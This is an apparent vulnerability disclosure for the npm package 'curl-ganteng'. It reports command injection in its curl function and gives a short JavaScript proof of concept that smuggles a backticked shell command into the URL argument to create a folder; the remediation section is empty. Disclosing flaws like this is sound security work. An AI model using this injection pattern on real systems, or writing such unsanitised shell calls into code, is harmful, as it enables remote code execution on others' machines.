## Summary
Affected versions of `curl-ganteng` npm package are vulnerable to command injection vulnerability in the `curl` function.

## Product
All versions of curl-ganteng npm package.

## Impact
This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.

## Steps to reproduce
Run the following PoC:

```js
var curl = require('curl-ganteng')
curl.curl("google.com' `mkdir pwnd`'").catch((a) => {console.log(a)}).then((a) => {console.log(a)})
```

### Expected result:
A new folder named ‘pwnd’ will be created.

## Remediation
